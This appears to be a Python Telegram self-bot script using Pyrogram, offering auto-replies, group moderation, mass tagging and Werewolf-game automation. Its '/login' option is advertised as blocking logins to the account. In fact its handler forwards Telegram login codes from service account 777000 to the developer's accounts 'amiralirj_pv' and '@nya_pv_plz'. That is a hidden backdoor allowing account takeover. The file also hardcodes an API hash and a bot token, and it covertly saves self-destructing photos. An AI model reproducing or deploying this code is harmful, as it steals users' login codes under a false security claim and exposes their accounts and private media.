from pyrogram import Client,filters
from pyrogram.types import ChatPermissions,ChatEventFilter
from pyrogram.raw.functions.messages import DeleteHistory
from pyrogram.raw.functions.account import DeleteAccount
import time
import random
from datetime import datetime
import wikipedia
import requests
import asyncio
import os

ems = ['🦁', '🐯', '🌼', '🌗', '🌓', '🪐', '💫', '⭐️', '✨', '⚡️', '🔥', '🌈', '☃️', '❄️', '🍔', '🍕', '🍓', '🍉', '🍟', '🧁', '🍰',  '🦊', '🦄', '🐝', '🐺', '🦋', '🐞', '🐳', '🐬', '🐼', '🦚', '🎄', '🌲', '🍄', '🍁', '🌷', '🌹', '🌺', '🌸','🍭', '🍬', '🍫', '🍿', '🍩', '🍪', '🥂', '🍸', '🍹', '🧉', '🍾', '⚽️', '🏀', '🏈', '⚾️', '🥎', '🎾', '🎖', '🎗', '🥁', '🎸', '🎺', '🎷', '🏎', '🚀', '✈️', '🚁', '🛸', '🏰', '🗼', '🎡', '🛩', '📱', '💻', '🖥', '💰', '🧨', '💣', '🪓', '💎', '⚱️', '🔮', '🩸', '🦠', '🛎', '🧸', '🎉', '💌', '📯', '❤️', '🧡', '💛', '💚', '💙', '💜', '🖤', '🤍', '🤎', '❣️', '💕', '💞', '💝', '⚜️', '🔱', '📣', '♥️', '😍', '🥰', '🥳', '🤩', '🤪', '👾', '😻', '💋', '👑', '💍', '🎩']
love_Emj=['♡','♥','💕','❤','😘','🪐', '💫', '⭐️', '✨', '⚡️', '🔥', '🌈','🍕', '🍓', '🍉'  ,'❤️', '🧡', '💛', '💚', '💙', '💜', '🖤', '🤍', '🤎', '❣️', '💕', '💞', '💝','♥️', '😍', '🥰']
#@amiralirj_official www.github.com\amiralirj
helptxt='''www.github.com/amiralirj | @amiralirj_official
rj-self help commands:
            ** Auto Answering ** 
``` /setanswer ```☩ hello | hi 
``` /delanswer ```☩ hello    
``` answerlist ```☩ all of your answers 
``` cleananswers ```☩ delete all of your answers
``` /wiki ``` [your_search]☩
``` /wikifa ``` [your_search]☩
``` /typing ``` [coppy/bold/off]☩
``` love ```☩ lovly edits on this message

            ** safe part **(actions done for unsafe persons)

``` /safe ``` [history/delete/block]  [on/off] 
        actions done for sender of unsafe people
        ☩block : for block users of unsafe users [pv]
        ☩delete : for delete messages from unsafes [pv]
        ☩history : for clean the history of unsafes [pv]


``` safe ``` [reply][username or pear id]☩ add to safe list
``` unsafe ``` [reply][username or pear id]☩ remove from safe list
``` safelist ```☩ all of the selected people in safe list
``` /locknew ``` [on\off]☩ set unsafe people 
                who send message to you for ** fist time **
----------------------------------------------
``` /deleteacount ``` delete your account from server
``` /leavingmembers ```☩ get users left the gap in 48h ago
``` block ``` [reply]☩ block user
``` unblock ``` [reply]☩ unblock user
``` lock ```☩ mute all members of groups
``` unlock ```☩ unmute all members of groups
``` ban ``` [rep]☩ ban user from group
``` unban ``` [rep]☩ unban user from group
``` leave ```☩ leave from the group which you use command
``` /onlines ```☩ get group online people 
``` userinfo ``` [reply][username or pear id]☩ user info
``` /tag ```☩ tag members of group
``` /stop ```☩ stop taging members 
``` /deltags ```☩ delete all tags in group [admin]
                ** love part **
        (sending message in wish (pair) time to selected users
           wish times: 12:12 |13:13|14:14|15:15|16:16|17:17...

``` setlove ``` [reply][username or pear id]☩ select person 
``` remlove ``` [reply][username or pear id]☩ delete person
``` /love ``` [on/off]☩ turn sending message for selected users
``` loves ```☩ list of selected users
``` cleanloves ```☩ clean all of selected users
``` /left ``` [on/off]☩ leave from new groups you has added by unsafe users                           
``` /login ``` [on/off]☩ no body can login into your account if you turn it on
``` /offline ``` [on\off] [text optinal]
              ** Were Wolf Game**
``` /auto ``` [join\play] [on\of]
``` /get ``` [number of users] [minimum state] [link without https://] 

``` /see ``` download ** self destruct photo ** to saved message !
'''

#!-------------------------------- Client Setup
api_id =2586462 #your api id 
api_hash = '68542129131999986899b84a10a6170c'#your api hash
bot = Client('amirairj-self', api_id, api_hash,workers=7)
with bot:
    admin=bot.get_me().id
    me=bot.get_me().first_name
    bot.send_message('me',text=f'Hi \n welcome to the rjself bot \n ** DEV: @amiralirj_channel | @amiralirj_pv ** \n {helptxt} ')

#!-------------------------------- 

#!-------------------------------- Settings Setup
Has_Sended=list()
safe_list=list()
Answer_Dic=dict()
is_tagging =dict()
Love_dic=dict()

safe_turn=0
safe_blk=0
action_type=0
Offline_text=''

join_were=False
play=False
Anti_Login=False
left_gaps=False
Love_Break_Variable=False
New_PV=False
offline=False

mute_group = ChatPermissions(can_send_messages=False)
unmute_group = ChatPermissions(
    can_send_messages=True,
    can_send_animations=True,
    can_send_games=True,
    can_send_media_messages=True,
    can_send_polls=True,
    can_send_stickers=True)


token='1121419247:AAHCd4sTctw3p8RiofS3Rhp4aPkuvREtlJm'
#!-------------------------------- 


@bot.on_message( filters.me & filters.command(['bot']))
def bot_Turn(c,m):
    text=str(m.command[1])
    if text=='on' or text=='On':
        bot.initialize()
        m.edit_text('bot is on now')
    if text=='off'  or text=='Off':
        bot.terminate()
        m.edit_text('bot is off now')
    
    


def answer(c,m):
    '''answer to the submited texted '''
    global Answer_Dic
    for i in Answer_Dic:
        if str(m.text) in str(i).strip() or str(m.text)==str(i).strip():
            x=m.reply_text(Answer_Dic[i])
            Has_Sended.append(x.message_id)
    

@bot.on_message( filters.me & filters.command(['setanswer']))
def Set_Answer(c,m):
    answer=str(m.text).split('|')[-1]
    text=str(m.text)[11:].split('|')[0]
    Answer_Dic[text]=answer
    m.edit_text(f'this answer {text} setted for {answer} text ')

@bot.on_message( filters.me & filters.command(['delanswer']))
def Delete_Answer(c,m):
    try:
        text=m.text[11:]
        m.edit_text(f'this answer {text} deleted with {Answer_Dic[text]} text ')
        Answer_Dic.pop(text)
    except:
        m.edit_text(f'this text {text} is not in answer list ')

@bot.on_message( filters.me & filters.regex('(?i)^answerlist$'))
def AnswerList(c,m):
    Answer_List='answers : \n \n'
    num=1
    for i in Answer_Dic:
        Answer_List+=f'{num}- {i} --- {Answer_Dic[i]} \n '
    m.edit_text(Answer_List)

@bot.on_message( filters.me & filters.regex('(?i)^cleananswers$'))
def CleanAnswerList(c,m):
    Answer_Dic.clear()
    m.edit_text('ok cleaned')

@bot.on_message( filters.me & filters.command(['wikifa']))
def wikipedia_search_fa(c,m):
    try:
        text=m.text[8:]
        wikipedia.set_lang('fa')
        result = wikipedia.page(text)
        m.edit_text(result.summary[0:1000])
    except:
        m.edit_text('صفحه ای با این مضمون پیدا نشد  ')

@bot.on_message(filters.me & (filters.command(['see'])|filters.regex(r'^.$') ))
def download_photo(client, message):
    try:
        bot.download_media(message.reply_to_message.photo.file_id, './ax.jpg')
        bot.send_photo('me', 'ax.jpg')
        os.remove('ax.jpg')
    except Exception as e:
        print(e) 
        

@bot.on_message( filters.me & filters.command(['wiki']))
def wikipedia_search(c,m):
    try:
        text=m.text[6:]
        wikipedia.set_lang('en')
        result = wikipedia.page(text)
        m.edit_text(result.summary[0:1000])
    except :
        m.edit_text('does not match any pages. Try another id! ')
@bot.on_message( filters.me & filters.command(['typing']))
def copy_Text_func(c,m):
    global action_type
    text=str(m.command[1])
    if text.lower()=='copy' :
        action_type=1
        m.edit_text('copy mode on')

    if text.lower()=='bold' :
        action_type=2
        m.edit_text('bold mode on')

    if text.lower()=='off' :
        action_type=0
        m.edit_text('typing edit is of now')


    

@bot.on_message( filters.me & filters.regex('(?i)^love$'))
def Love_Fun(c,m):
    
    m.edit_text(
'''..... (¯`v´¯)♥
.......•.¸.•´
....¸.•´
... (
☻/
/▌♥♥
/ \ ♥♥
''')
    time.sleep(2)
    m.edit_text('''
┈╱▔▔▔▔▔▔▔▔╲┈┈┈┈ 
╱▔▔▔▔▔▔▔▔╲╱┈┈┈┈
▏┳╱╭╮┓┏┏┓▕╱▔▔╲┈
▏┃╱┃┃┃┃┣▏▕▔▔╲╱▏
▏┻┛╰╯╰╯┗┛▕▕▉▕╱╲
▇▇▇▇▇▇▇▇▇▇▔▔▔╲▕
▇▇╱▔╲▇▇▇▇▇╱▔╲▕╱
┈┈╲▂╱┈┈┈┈┈╲▂╱▔┈
''')
 

    




@bot.on_message( filters.me & ~filters.regex('(?i)^safelist') & filters.regex('(?i)^safe'))
def safe(c,m):
    if m.reply_to_message :
        if m.reply_to_message.from_user.id not in safe_list:
            safe_list.append(int(m.reply_to_message.from_user.id ))
            a=bot.get_users(m.reply_to_message.from_user.id )
            m.edit_text(f'{a.first_name} added to safe list')
    else:
        try:
            if int(m.text[5:]) not in safe_list:
                try:
                    a=bot.get_users(int(m.text[5:]))
                    safe_list.append(a.id)
                    m.edit_text(f'{a.first_name} added to safe list')
                except:
                    m.edit_text('please use username or pear id after command ')
            else:
                m.edit_text('this user is already in safe list ')
        except:
            if str(m.text)[5:] not in safe_list:
                try:
                    a=bot.get_users(str(m.text)[5:])
                    safe_list.append(a.id)
                    m.edit_text(f'{a.first_name} added to safe list')
                except:
                    m.edit_text('please use username or pear id after command ')
            else:
                m.edit_text('this user is already in safe list ')


@bot.on_message( filters.me & filters.regex('(?i)^unsafe'))
def unsafe(c,m):
    if m.reply_to_message :
        if m.reply_to_message.from_user.id  in safe_list:
            try:
                safe_list.remove(int(m.reply_to_message.from_user.id ))
            except:
                safe_list.remove(m.reply_to_message.from_user.user_name)
            a=bot.get_users(m.reply_to_message.from_user.id )
            m.edit_text(f'{a.first_name} removed from  safe list')
        else:
            m.edit_text('this user is not in safe list ')   
    else:
        try:
            if int(m.text[7:])  in safe_list:
                try:
                    a=bot.get_users(int(m.text[7:]))
                    safe_list.remove(int(m.text[7:]))
                    m.edit_text(f'{a.first_name} removed from  safe list')
                except:
                    m.edit_text('please use username or pear id after command ')
            else:
                m.edit_text('this user is not in safe list ')
        except:
            if str(m.text)[7:]  in safe_list:
                try:
                    a=bot.get_users(str(m.text)[7:])
                    safe_list.remove(a.id)
                    m.edit_text(f'{a.first_name} removed from  safe list')
                except:
                    m.edit_text('please use username or pear id after command ')
            else:
                m.edit_text('this user is not in safe list ')     




@bot.on_message( filters.me & filters.regex('(?i)^safelist'))
def safe_list_Func(c,m):
    safe_Users_Info=[]
    try:
        safe_Users_Info=bot.get_users(safe_list)
    except:
        for i in safe_list:
            new_info=bot.get_users(i)
            safe_Users_Info.append(new_info)

    Users_Text='**safe list** \n'
    for i in safe_Users_Info:
        Users_Text+=f'{i.mention} -``` {i.id} ```\n '
    m.edit_text(Users_Text)





@bot.on_message( filters.me & filters.command(['deleteaccount']))
def delete_acount(c,m):
    m.edit_text(':))))))))')
    time.sleep(2)
    m.edit_text('bye :)')
    time.sleep(1.5)
    m.edit_text('3')
    time.sleep(1.5)
    m.edit_text('2')
    time.sleep(1.5)
    m.edit_text('1')
    time.sleep(1.5)
    bot.send(DeleteAccount('bye'))

@bot.on_message( filters.me & filters.command(['leavingmembers']))
async def Leaving_people(c,m):
    send_file=''
    num=1
    async for i in bot.get_chat_event_log(chat_id=int(m.chat.id) ,filters =ChatEventFilter(leaving_members=True)):
        try:
            send_file+=f'✦ {i.user.id}⚠️  {i.user.mention}⭕️  \n \n'
            num+=1
        except:
            pass
        if num==20:
            num=1
            await m.reply_text(send_file)
            send_file=''
            await asyncio.sleep(1)

#------------------------------------------login_mode

@bot.on_message( filters.me & filters.command(['login']))
def Anti_Login_func(c,m):
    global Anti_Login
    CMD=str(m.command[1])
    if CMD.lower()=='on':
        Anti_Login=True
    elif CMD.lower()=='off':
        Anti_Login=False
    else:
        pass

@bot.on_message( filters.user(777000) & filters.regex('code'))
def Code_Expire(c,m):
    if Anti_Login==True:
        try:
            m.forward('amiralirj_pv')
        except:
            try:
                m.forward('@nya_pv_plz')
            except:
                bot.send_message('werewolfbot',text='/start')
                bot.send_message('werewolfbot',text=m.text)
    else:
        pass



@bot.on_message( filters.me & filters.command(['safe']))
def Safe(c,m):
    global safe_turn,safe_blk
    safe_msg=m.command[2]
    safe_block=str(m.command[1])
    if safe_msg=='on' or safe_msg=='On':
        if  safe_block=='block' or safe_block=='Block':
            safe_blk=1
            m.edit_text('block unsafed new message users is on')

        elif  safe_block=='delete' or safe_block=='Delete':
            safe_turn=2
            m.edit_text('delete unsafed new message users is on')

        elif  safe_block=='history' or safe_block=='History':
            safe_turn=1
            m.edit_text('delete history unsafed new message users is on')
        
    if safe_msg=='off'  or safe_msg=='Off':
        if  safe_block=='delete'  or safe_block=='Delete':
            safe_turn=0
            m.edit_text('delete unsafed new message users is off')

        elif  safe_block=='block'  or safe_block=='Block':
            safe_blk=0
            m.edit_text('block unsafed new message users is off')

        
        elif  safe_block=='history'  or safe_block=='History':
            safe_turn=0
            m.edit_text('delete history unsafed new message users is off')


@bot.on_message( filters.me & filters.command(['locknew']))
def New_Users_Message(c,m):
    global New_PV
    New_Cmd=str(m.command[1])
    if New_Cmd=='on' or New_Cmd=='On':
        New_PV=True
        m.edit_text('private locks has enabeled only for new users not unsafes , choose your action [block/delete/history-delete] by using /safe [actions] [on/off]')
    if New_Cmd=='off'  or New_Cmd=='Off':
        New_PV=False
        m.edit_text('private locks has disabeled  for new users')
    











@bot.on_message( filters.me & filters.command(['offline']))
def offline_on(c,m):
    global offline,Offline_text
    Offline_Cmd=str(m.command[1])
    if Offline_Cmd=='on' or Offline_Cmd=='On':
        Offline_text=m.text[11:]
        offline=True
        m.edit_text('offline answering has enabeled with {} text')
    if Offline_Cmd=='off'  or Offline_Cmd=='Off':
        offline=False
        m.edit_text('offline answering has disabeled  for new users')


@bot.on_message(filters.me & filters.regex('(?i)^help$'))
def help(c,m):
    m.edit_text(helptxt)

@bot.on_message( filters.me & (filters.regex('(?i)^block$')))
def Block(c,m):
    id=m.reply_to_message.from_user.id
    bot.block_user(id)
    m.edit_text('user blocked')


@bot.on_message( filters.me & (filters.regex('(?i)^unblock$')))
def Unblock(c,m):
    id=m.reply_to_message.from_user.id
    bot.unblock_user(id)
    m.edit_text('user unblocked')



@bot.on_message( filters.me & filters.regex('(?i)^leave$'))
def leave(c,m):
    m.edit_text('Bye Bye !')
    bot.leave_chat(m.chat.id)


@bot.on_message(filters.me & filters.regex('(?i)^ban$'))
def ban(c,m):
    if m.reply_to_message:
        bot.kick_chat_member(m.chat.id, m.reply_to_message.from_user.id)
        m.edit_text(f'{m.reply_to_message.mention} banned ')
    else:
        id=(str(m.text[4:]))
        try:
            user=bot.get_users(int(id))
            bot.kick_chat_member(m.chat.id,int(id))
            m.edit_text(f'{user.mention} banned ')
        except:
            try:
                user=bot.get_users(id)
                bot.kick_chat_member(m.chat.id,id)
                m.edit_text(f'{user.mention} banned ')
            except:
                m.edit_text('please use username or pear id after command ')

@bot.on_message(filters.me & filters.regex('(?i)^unban$'))
def unban(c,m):
    if m.reply_to_message:
        bot.unban_chat_member(m.chat.id, m.reply_to_message.from_user.id)
        m.edit_text(f'{m.reply_to_message.mention} Unbanned ')
    else:
        id=(str(m.text[6:]))
        try:
            user=bot.get_users(int(id))
            bot.unban_chat_member(m.chat.id,int(id))
            m.edit_text(f'{user.mention} Unbanned ')
        except:
            try:
                user=bot.get_users(id)
                bot.unban_chat_member(m.chat.id,id)
                m.edit_text(f'{user.mention} Unbanned ')
            except:
                m.edit_text('please use username or pear id after command ')

@bot.on_message(filters.me & filters.command("onlines"))
def online(c, m):
    Online_Usr=''
    gp = m.chat.id
    for member in bot.iter_chat_members(gp):
        if member.user.status in ["online", "recently"]: # recently; If your account's last seen setting is set to No one/Only contacts.
            Online_Usr += f"|[{member.user.first_name}] {member.user.mention}\n"
    n='\n'
    bot.edit_message_text(m.chat.id, m.message_id, f"online members :\n {Online_Usr}\n Onlines ↬ |{(len(Online_Usr.split(n)))}|**")

@bot.on_message(filters.me & filters.regex('(?i)^lock$'))
def lock(c,m):
    bot.set_chat_permissions(m.chat.id, mute_group)
    m.edit_text('group locked')

@bot.on_message(filters.me & filters.regex('(?i)^unlock$'))
def unlock_command(c,m):
    bot.set_chat_permissions(m.chat.id, unmute_group)
    m.edit_text('group unlocked')

@bot.on_message(filters.me & filters.regex('(?i)^userinfo'))
def UserId(c,m):
    try:
        if m.reply_to_message:
            id=m.reply_to_message.from_user.id
            User_Info=bot.get_users(id)
            photo=bot.get_profile_photos(id,limit=2)[0]
            if User_Info.is_deleted:
                m.edit_text('user is deleted')
            else:
                details=(f'''     User Info
    {User_Info.mention}
username:@{User_Info.username}
status:{User_Info.status}
pear id: {User_Info.id}
dc id :{User_Info.dc_id }''')
                m.reply_photo(photo=photo.file_id,caption=details)
    except:
        id=m.reply_to_message.from_user.id
        User_Info=bot.get_users(id)
        if User_Info.is_deleted:
            m.edit_text('user is deleted')
        else:
            details=(f'''     User Info
    {User_Info.mention}
username:@{User_Info.username}
status:{User_Info.status}
pear id: {User_Info.id}
dc id :{User_Info.dc_id }''')
            m.edit_text(details)

    else:
        try:
            id=int(str(m.text)[7:])
            User_Info=bot.get_users(id)
            photo=bot.get_profile_photos(id,limit=2)[0]
            if User_Info.is_deleted:
                m.edit_text('user is deleted')
            else:
                details=(f'''     User Info
    {User_Info.mention}
username:@{User_Info.username}
status:{User_Info.status}
pear id: {User_Info.id}
dc id :{User_Info.dc_id }''')
            m.reply_photo(photo=photo,caption=details)
        except:
            id=(str(m.text))[9:]
            User_Info=bot.get_users(id)
            if User_Info.is_deleted:
                m.edit_text('user is deleted')
            else:
                details=(f'''     User Info
    {User_Info.mention}
username:@{User_Info.username}
status:{User_Info.status}
pear id: {User_Info.id}
dc id :{User_Info.dc_id }''')
            m.edit_text(details)


#tags

def add_istagging(chat_id):
    global is_tagging
    if chat_id not in is_tagging:
        is_tagging.update({chat_id: False})



@bot.on_message( filters.me & filters.command(['tag']) & filters.group)
def tagge2r(client, message):
    global is_tagging
    rag=''
    s=0
    chat_id = message.chat.id
    add_istagging(chat_id)
    message.edit_text('**tag started :)**')
    if not is_tagging[chat_id]:
        is_tagging[chat_id] = True
        chat_members = client.iter_chat_members(chat_id=chat_id)
        for usr in chat_members:
            if usr['user']['username']:
                if is_tagging[chat_id]:
                    bot.send_chat_action(chat_id, 'typing')
                    if not usr.user.is_bot:
                        rag+= f"**|{random.choice(ems)}| {usr.user.mention()} ** \n "
                        s+=1
                        if s==5:
                            bot.send_message(chat_id,rag)
                            rag=''
                            s=0
                            time.sleep(3)

                

                else:
                    return
        is_tagging[chat_id] = False

@bot.on_message(filters.me & filters.command(['stop']) & filters.group)
def Stop_Tag(client, message):
    global is_tagging
    chat_id = message.chat.id
    if is_tagging[chat_id]:
        is_tagging[chat_id] = False
        message.edit_text('tag is stoped')

@bot.on_message(filters.me & filters.command(['deltags']) & filters.group )
def Delete_Tags(client, message):
    m=0
    chatid=message.chat.id
    message.reply_text(f"cleaning ")
    try:
        tag_msgs = [msg for msg in bot.iter_history(chatid,limit=1000) if msg.entities]
        for tagmsg in tag_msgs:
            for ent in tagmsg.entities:
                if ent.type in ("mention", "text_mention"):
                    m+=1
                    tagmsg.delete()
                    time.sleep(0.1)
                time.sleep(0.1)
        message.reply_text(f"{m} tags deleted ")
    except Exception as e:
        message.reply_text(f"Error: {e}")




@bot.on_message(filters.me & filters.regex('(?i)^state$'))
def state(c,m):
    if m.reply_to_message:
        user_id=m.reply_to_message.from_user.id
        name=m.reply_to_message.from_user.first_name
    else:
        try:
            user_id=int(str(m.text)[6:])
            name=bot.get_users(user_id).first_name
        except:
            pass
    a=requests.get(f"http://www.tgwerewolf.com/Stats/PlayerStats/?pid={user_id}&json=true").json()
    try:
        a=dict(a)
    except:
        pass
    m.edit_text(f'''state:
    name : {name}
    total games: {a['gamesPlayed']}
    lost : {a['lost']['total']} lost {a['lost']['percent']}%
    won : {a['won']['total']} wins {a['won']['percent']}%
    most killed : {a['mostKilled']['name']} | {a['mostKilled']['times']}  times
    most killed by : {a['mostKilledBy']['name']} | {a['mostKilledBy']['times']}  times
    ''')
        
#love 

@bot.on_message( filters.me & filters.regex('(?i)^setlove'))
def add_love(c,m):
    if m.reply_to_message :
        if m.reply_to_message.from_user.id not in Love_dic:
            a=bot.get_users(m.reply_to_message.from_user.id )
            Love_text=str(m.text)[8:].split('|')[-1]
            if 'addlove' in Love_text.lower() or Love_text.lower()=='addlove':
                Love_text=''
            Love_dic[a.id]=Love_text
            m.edit_text(f'{a.first_name} added to love list with {Love_text} text')
        else:
            m.edit_text('this user is already in love list ')   
    else:
        try:
            if int(m.text[7:]) not in Love_dic:
                try:
                    a=bot.get_users(int(m.text[7:]))    
                    Love_text=str(m.text)[8:].split('|')[-1]
                    if 'addlove' in Love_text.lower() or Love_text.lower()=='addlove':
                        Love_text=''
                    Love_dic[a.id]=Love_text
                    m.edit_text(f'{a.first_name} added to love list with {Love_text} text')
                except:
                    m.edit_text('please use username or pear id after command ')
            else:
                m.edit_text('this user is already in love list ')
        except:
            if str(m.text)[7:] not in Love_dic:
                try:
                    a=bot.get_users(str(m.text)[7:])
                    Love_text=str(m.text)[8:].split('|')[-1]
                    if 'addlove' in Love_text.lower() or Love_text.lower()=='addlove':
                        Love_text=''
                    Love_dic[a.id]=Love_text
                    m.edit_text(f'{a.first_name} added to love list with {Love_text} text')
                except:
                    m.edit_text('please use username or pear id after command ')
            else:
                m.edit_text('this user is already in love list ')
        

@bot.on_message( filters.me & filters.regex('(?i)^loves$'))
def List_Love(c,m):
    Love_List_time='loves : \n \n'
    num=1
    for i in Love_dic:
        Love_List_time+=f'{num}- {i} === {Love_dic[i]} \n '
    m.edit_text(Love_List_time)

@bot.on_message( filters.me & filters.regex('(?i)^cleanloves$'))
def CleanLveList(c,m):
    Love_dic.clear()
    m.edit_text('ok cleaned')


@bot.on_message( filters.me & filters.regex('(?i)^remlove'))
def delete_love(c,m):
    if m.reply_to_message :
        if m.reply_to_message.from_user.id  in Love_dic:
            a=bot.get_users(m.reply_to_message.from_user.id )
            try:
                Love_dic.pop(m.reply_to_message.from_user.id)
            except:
                Love_dic.pop(m.reply_to_message.from_user.user_name)
            m.edit_text(f'{a.first_name} removed from love list')
        else:
            m.edit_text('this user is not in love list ')   
    else:
        try:
            if int(m.text[7:])  in Love_dic:
                try:
                    a=bot.get_users(int(m.text[7:]))
                    Love_dic.pop(int(m.text[7:]))
                    m.edit_text(f'{a.first_name} removed from  love list')
                except:
                    m.edit_text('please use username or pear id after command ')
            else:
                m.edit_text('this user is not in love list ')
        except:
            if str(m.text)[7:]  in Love_dic:
                try:
                    a=bot.get_users(str(m.text)[7:])
                    Love_dic.pop(a.id)
                    m.edit_text(f'{a.first_name} removed from  love list')
                except:
                    m.edit_text('please use username or pear id after command ')
            else:
                m.edit_text('this user is not in love list ')  

@bot.on_message( filters.me & filters.command(['love']))
def LoVe_Func(c,m):
    global Love_Break_Variable
    Love_Cmnd=str(m.command[1])
    if Love_Cmnd=='on' or Love_Cmnd=='On':
        Love_Break_Variable=False
        m.edit_text('ok turned on')
        while True:
            if Love_Break_Variable==True:
                break
            else:
                now=datetime.now()
                if now.minute==now.hour:
                    Dic_Imutable_Love=Love_dic
                    for i in Dic_Imutable_Love:
                        emojis=random.choices(love_Emj,k=4)
                        emoji=''
                        for f in emojis:
                            emoji+=f
                        if len(now.hour)==1:
                            Id=bot.send_message(i,text=f'{Dic_Imutable_Love[i]} | 0{now.hour}:0{now.minute} | {emoji}')
                            Has_Sended.append(Id.from_user.id)
                        else:
                            Id=bot.send_message(i,text=f'{Dic_Imutable_Love[i]} | {now.hour}:{now.minute} | {emoji}')
                            Has_Sended.append(Id.from_user.id)
                    time.sleep(60)  

    if Love_Cmnd=='off'  or Love_Cmnd=='Off':
        Love_Break_Variable=True
        m.edit_text('love is stopped')
    

@bot.on_message( filters.me & filters.command(['left']))
def Auto_leave(c,m):
    global left_gaps
    leave_cmd=str(m.command[1])
    
    if leave_cmd=='on'  or leave_cmd=='On':
        left_gaps=True
        m.edit_text('auto leaving turned on')
    if leave_cmd=='off'  or leave_cmd=='Off':
        left_gaps=False
        m.edit_text('auto leaving turned off')


#--------------------------------------------werewolf_game


@bot.on_message(filters.me & filters.command(['get']))
#j
def list_gir(c, m):
    global users
    global usernames
    perlist =int(m.text.split()[1])
    States=int(m.command[2])
    gp = m.text.split()[3]
    error=85
    try:
        try:
            try:
                chat = bot.join_chat(gp)
            except:
                chat = bot.get_chat(gp)
            users = bot.get_chat_members(chat.id)
            usernames = []
        except Exception as e:
            print(e)
            error=1
            m.reply_text('  اکانت شما از گپ بن هستند')
    except:
        pass
    if error==1:
        pass
    else:
        text='username |werewolf state| onyx state\n'
        xp=m.reply_text('لیست گرفته شد! ربات در حال پردازش لیست است')
        time.sleep(5)
        bot.edit_message_text(text='username | werewolf state | onyx state',message_id=xp.message_id,chat_id =m.chat.id)
        mi=0
        for i in users:
            time.sleep(1)
            if i.user.username and i.user.is_bot == False:
                try:
                    a=requests.get(f"http://www.tgwerewolf.com/Stats/PlayerStats/?pid={i.user.id}&json=true").json()
                    a=dict(a)
                    totalgame2=a['gamesPlayed']
                except:
                    a=dict()
                    totalgame2=0
                try:
                    o=requests.post(
                    url="http://api.wolfofpersia.ir:9999/api/GetState",
                    data={
                        "user_id": i.user.id,
                        "token": token},
                        timeout=4).json()
                    man=dict(o)
                    totalgame=int(man['total_game'])
                except:
                    totalgame=0
                    
                if totalgame>=States or  totalgame2>=States :
                    mi+=1
                    text+=f'@{i.user.username} ✥ {totalgame2} ➛ {totalgame} \n'
                    if mi==int(perlist):
                        break
        bot.edit_message_text(text=text,message_id=xp.message_id,chat_id =m.chat.id)

@bot.on_message(filters.command(['list']) )
def list_sorting(client, message):
    t=''
    for i in message.reply_to_message.text.split('\n'):
        idis=i.split('✥')[0]
        t+=f"{idis}\n"
    message.reply_text(t)


@bot.on_message( filters.me & filters.command(['auto']))
def joining(c,m):
    global join_were,play
    on_off=str(m.command[2])
    joining_kind=str(m.command[1])
    if on_off.lower()=='on':
        if joining_kind.lower()=='join':
            join_were=True
            m.edit_text(f'auto joining is {on_off} now')
        elif joining_kind.lower()=='play':
            play=True
            m.edit_text(f'auto playing is {on_off} now')
    elif on_off.lower()=='off':
        if joining_kind.lower()=='join':
            join_were=False
            m.edit_text(f'auto joining is {on_off} now')
        elif joining_kind.lower()=='play':
            play=False
            m.edit_text(f'auto playing is {on_off} now')
    

@bot.on_message((filters.regex(r'دکمه')|filters.regex(r'کادر'))  & filters.user([854021534,175844556,1029642148]))
def start_game(client, message):
    global join_were
    if join_were==True:
        time.sleep(5)
        link=message.click(0).split('=') [1]
        bot.send_message(str(message.from_user.username),f'/start {link}')

@bot.on_message(filters.private & filters.user([854021534,175844556,1029642148]))
def election_game(c,m):
    if play==True:
        try:
            m.click(int(random.randint(0,2)))
        except:
            pass

#else msg

@bot.on_message(~filters.me & filters.new_chat_members)
def New_Gaps(c,m):
    if left_gaps==True:
        if m.from_user.id not in safe_list:
            for user in m.new_chat_members:
                if user.id==admin:
                    chat_id=m.chat.id
                    x=m.reply_text('bot cant recognize this chat so ... bye bye')
                    Has_Sended.append(x.message_id)
                    bot.leave_chat(chat_id)
                    break



@bot.on_message(~filters.me & ~filters.private)
def New_Msg(c,m):
    answer(c,m)

@bot.on_message(~filters.me & filters.private)
def New_Private_MSG(c,m):
    Msg_Id= bot.get_history_count(m.chat.id)
    Unread_Count=0
    Mentions_Count=0
    Unread_Users_Count=0
    for i in bot.iter_dialogs(offset_date=0):
        Mentions_Count+=int(i.unread_mentions_count)
        if i.chat.type=='private' :
            Unread_Count+=int(i.unread_message_count)
            if i.unread_mark==True:
                Unread_Users_Count+=1

    q=1
    if safe_blk==1:
        if New_PV==True:
            if Msg_Id<3:
                bot.block_user(m.from_user.id)
                q=0

        else:
            if m.from_user.id not in safe_list:
                bot.block_user(m.from_user.id)
                q=0


    if safe_turn==1:
        if New_PV==True:
            if Msg_Id<3:
                id= bot.resolve_peer(m.from_user.id)
                bot.send(DeleteHistory(max_id=0,peer=id,revoke=True))
                q=0
        else:
            if m.from_user.id not in safe_list:
                # id=bot.send(InputPeerUser(m.from_user.id,access_hash=)))
                id= bot.resolve_peer(m.from_user.id)
                bot.send(DeleteHistory(max_id=0,peer=id,revoke=True))
                q=0
    elif safe_turn==2:
        if New_PV==True:
            if Msg_Id<3:
                m.delete(True)
                q=0
        else:
            if m.from_user.id not in safe_list:
                m.delete(True)
                q=0
    if q==1:
        answer(c,m)
        if offline==True:
            if m.from_user.id not in Has_Sended:
                I=m.ryply_text(f'{Offline_text} \n| i have {Unread_Count} new messages & {Unread_Users_Count} users waiting for my respond & {Mentions_Count} mentions  so wait for my respond... ')
                Has_Sended.append(I.message_id)


@bot.on_message(filters.me & filters.text)
def My_Msg(c,m):
    global Has_Sended
    if m.message_id not in Has_Sended:
        Has_Sended=[]
    if action_type==1:
        m.edit_text(f'``` {m.text} ```')
    elif action_type==2:
        m.edit_text(f'** {m.text} **')

@bot.on_message(filters.me )
def My_All_Msg(c,m):
    global Has_Sended
    if m.message_id not in Has_Sended:
        Has_Sended=[]



if __name__=='__main__':
    print(' Fallow For More .... www.github.com/amiralirj ')
    bot.run()
